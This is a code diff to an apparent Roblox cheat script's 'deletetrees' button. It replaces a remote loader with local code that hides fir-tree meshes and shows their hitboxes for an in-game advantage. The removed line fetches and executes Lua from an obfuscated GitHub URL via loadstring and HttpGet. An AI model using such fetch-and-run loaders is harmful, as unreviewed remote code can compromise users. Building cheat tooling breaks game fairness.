@@ -256,5 +256,41 @@ end
 end)
 
 createButton("deletetrees", 280, function ()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIIIIIIIIlllllllllIIIIIIIIIllIlIIlIl/llllllllllllIIIIIIIIIIIIIlIIllIlIIIIllllIlIIlIIIlIIllIIlIIIIIllllIlIIlIIIlIIllIIlIIIllIIlIIlIIllIIll/refs/heads/main/IlIIlIIIlIIllIIlIIIIIllllIlIIlIIlIIlIIIlIIllIIlIIIIIllllIIIlIIlIIIlIIllIIlIIIIIllllIlIlIIlII"))()
+   local StarterGui = game:GetService("StarterGui")
+
+local TreesFolder = game.Workspace
+    :WaitForChild("Map")
+    :WaitForChild("CopeTrialsDirectory")
+    :WaitForChild("Hunt")
+    :WaitForChild("Parts")
+    :WaitForChild("Trees")
+
+local function notify(text)
+    StarterGui:SetCore("SendNotification", {
+        Title = "System",
+        Text = text,
+        Duration = 4
+    })
+end
+
+for _, tree in ipairs(TreesFolder:GetChildren()) do
+    if tree.Name == "fir_9" and tree:IsA("MeshPart") then
+        
+        -- 🌲 Try to strip mesh completely
+        pcall(function()
+            tree.MeshId = "" -- may or may not actually apply
+        end)
+
+        tree.TextureID = ""
+        tree.Transparency = 1
+
+        -- 🧱 Hitbox
+        local hitbox = tree:FindFirstChild("Part")
+        if hitbox and hitbox:IsA("BasePart") then
+            hitbox.Transparency = 0.5
+        end
+    end
+end
+
+notify("Fir trees hidden, hitboxes visible.")
 end)
